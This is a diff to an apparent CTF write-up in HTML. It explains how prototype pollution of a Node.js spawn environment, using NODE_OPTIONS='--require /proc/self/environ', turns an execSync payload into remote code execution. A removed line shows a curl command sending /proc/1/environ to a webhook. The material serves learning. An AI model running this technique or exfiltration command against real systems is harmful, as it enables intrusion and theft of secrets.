@@ -274,12 +274,32 @@ Host: f697-1-52-54-122.ngrok.io
 &lt;p>I polluted the following:&lt;/p>
 &lt;pre>&lt;code class="language-javascript">shell = &amp;quot;/usr/local/bin/node&amp;quot;;
 env = {
+payload: 'require(&amp;quot;child_process&amp;quot;).execSync(&amp;lt;RCE payload&amp;gt;);//',
 NODE_OPTIONS: &amp;quot;--require /proc/self/environ&amp;quot;,
-payload:
-'require(&amp;quot;child_process&amp;quot;).execSync(\'curl -d &amp;quot;$(cat /proc/1/environ)&amp;quot; webhook\');//',
 };
 &lt;/code>&lt;/pre>
 &lt;p>Run the &lt;code>/cowsay&lt;/code> route and the server will execute the payload and we got the flag.&lt;/p>
+&lt;h4 id="note-to-self">Note to self:&lt;/h4>
+&lt;p>More elaboration:&lt;/p>
+&lt;ul>
+&lt;li>Running &lt;code>spawnSync(&amp;quot;abc&amp;quot;, [&amp;quot;arg1&amp;quot;, &amp;quot;arg2], { shell: &amp;quot;node&amp;quot;, env: { env1: val1, env2: val2 }})&lt;/code> is equivalent to&lt;/li>
+&lt;/ul>
+&lt;pre>&lt;code class="language-bash">export ENV1=val1; export ENV2=val2; node -c &amp;quot;abc arg1 arg2&amp;quot;
+&lt;/code>&lt;/pre>
+&lt;ul>
+&lt;li>
+&lt;p>With &lt;code>NODE_OPTIONS=--require /proc/self/environ&lt;/code>, &lt;code>node&lt;/code> will &lt;code>require&lt;/code> the file &lt;code>/proc/self/environ&lt;/code>, which in the case above will be &lt;code>ENV1=val1 ENV2=val2&lt;/code>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>The polluted &lt;code>env&lt;/code> must have &lt;code>payload&lt;/code> as the first property so it becomes:&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;pre>&lt;code class="language-bash">export PAYLOAD=&amp;quot;require(\&amp;quot;child_process\&amp;quot;).execSync(&amp;lt;payload&amp;gt;);//&amp;quot; NODE_OPTIONS=&amp;quot;--require /proc/self/environ&amp;quot; node -c &amp;quot;abc arg1 arg2&amp;quot;
+&lt;/code>&lt;/pre>
+&lt;p>and &lt;code>/proc/self/environ&lt;/code>&amp;rsquo;s content is:&lt;/p>
+&lt;pre>&lt;code class="language-bash">PAYLOAD=require(&amp;quot;child_process&amp;quot;).execSync(&amp;lt;payload&amp;gt;);// NODE_OPTIONS=--require /proc/self/environ
+&lt;/code>&lt;/pre>
+&lt;p>The &lt;code>//&lt;/code> is required to ignore the other env variables. The content of the file is now valid JS and will be executed, giving me RCE.&lt;/p>
 &lt;h2 id="some-2meirl4meirl-thoughts">Some 2meirl4meirl thoughts&lt;/h2>
 &lt;pre>&lt;code class="language-text">&amp;gt; still have an irrational fear of Java.
 &amp;gt; could not solve the 1 non-Java challenge left.
